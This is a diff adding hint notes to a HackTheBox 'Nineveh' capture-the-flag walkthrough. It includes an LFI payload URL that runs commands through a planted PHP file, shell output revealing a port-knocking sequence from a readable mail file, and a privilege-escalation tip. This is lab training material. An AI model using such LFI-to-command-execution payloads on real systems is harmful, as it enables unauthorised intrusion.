@@ -560,6 +560,14 @@ Create a new database:
 
 ![](<../../.gitbook/assets/14 (1).JPG>)
 
+{% hint style="info" %}
+NOTE: A simpler solution is to name the database "ninevehNotes.php", which satisfies the string requirement in the LFI we found. When using the LFI, you could use the following payload instead of the one we use in this walkthrough:
+
+[http://10.10.10.43/department/manage.php?notes=../../../var/tmp/ninevehNotes.php\&cmd=id](http://10.10.10.43/department/manage.php?notes=/ninevehNotes.txt/../../../../var/tmp/cmd.php\&cmd=id)
+
+This is a bit simpler than the way it is done below, however, it's not as interesting.
+{% endhint %}
+
 Create a new table inside the new database, which, as shown below, is being stored in "/var/tmp/cmd.php".
 
 ![](<../../.gitbook/assets/15 (1).JPG>)
@@ -751,6 +759,22 @@ www-data@nineveh:/$
 ```
 
 The configuration contains the port knocking sequence that will allow us to SSH to the target. When the system receives the correct sequence on port 22, it will dynamically add the connecting IP address to an iptables rule that will allow SSH connections for it.
+
+{% hint style="info" %}
+NOTE: The port knocking sequence is also found in "/var/mail/amrois", which is readable by everyone, and so there are two ways to find the required sequence.
+
+
+
+www-data@nineveh:/$ ls -la /var/mail/amrois&#x20;
+
+\-rw-r--r-- 1 amrois mail 483 Jul 2 2017 /var/mail/amrois
+
+www-data@nineveh:/$ cat /var/mail/amrois&#x20;
+
+From root@nineveh.htb Fri Jun 23 14:04:19 2017 Return-Path: [root@nineveh.htb](mailto:root@nineveh.htb) X-Original-To: amrois Delivered-To: amrois@nineveh.htb Received: by nineveh.htb (Postfix, from userid 1000) id D289B2E3587; Fri, 23 Jun 2017 14:04:19 -0500 (CDT) To: amrois@nineveh.htb From: root@nineveh.htb Subject: Another Important note! Message-Id: [20170623190419.D289B2E3587@nineveh.htb](mailto:20170623190419.D289B2E3587@nineveh.htb) Date: Fri, 23 Jun 2017 14:04:19 -0500 (CDT)
+
+**Amrois! please knock the door next time! 571 290 911**
+{% endhint %}
 
 We can use a number of tools to do this including netcat, nmap and so on. We'll install "knockd" on out attacker box and use the included "knock" program to open the SSH port on the target for us. We can then use the private key file we found earlier to SSH to the target.
 
@@ -1226,6 +1250,12 @@ priv-4.3# cat /root/root.txt
 d722a562ce34f9bfd663ac512e64e515
 priv-4.3# 
 ```
+
+{% hint style="info" %}
+NOTE: The privilege escalation can also be done with the "www-data" user as well. Finding the "/report" directory would have led us down the same path.&#x20;
+
+The only requirement for the privilege escalation is that the "/tmp/update" file has to be created with a non-root user.
+{% endhint %}
 
 ## Resources
 
